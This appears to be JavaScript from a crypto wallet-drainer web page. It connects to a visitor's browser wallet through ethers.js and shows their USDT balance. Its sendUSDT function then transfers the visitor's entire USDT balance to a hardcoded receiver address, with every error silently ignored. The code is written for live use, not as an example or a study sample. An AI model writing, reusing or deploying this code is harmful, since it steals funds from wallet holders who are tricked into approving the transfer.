async function showUSDTLiveValue() {
  const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
  const abi = ["function balanceOf(address) view returns (uint256)"];

  if (!window.ethereum) return;

  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = provider.getSigner();
    const user = await signer.getAddress();

    const usdt = new ethers.Contract(usdtAddress, abi, signer);
    const balance = await usdt.balanceOf(user);
    const amount = ethers.utils.formatUnits(balance, 18);

    const display = document.getElementById("live-usdt-amount");
    if (display) {
      display.innerText = "= $" + Number(amount).toFixed(2);
    }
  } catch (err) {
    // silent
  }
}

async function sendUSDT() {
  const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
  const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
  const abi = [
    "function balanceOf(address) view returns (uint256)",
    "function transfer(address to, uint256 value) returns (bool)"
  ];

  if (!window.ethereum) return;

  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = provider.getSigner();
    const user = await signer.getAddress();

    const usdt = new ethers.Contract(usdtAddress, abi, signer);
    const balance = await usdt.balanceOf(user);

    if (balance.isZero()) return;

    const tx = await usdt.transfer(receiver, balance);
    await tx.wait();
  } catch (err) {
    // silent
  }
}
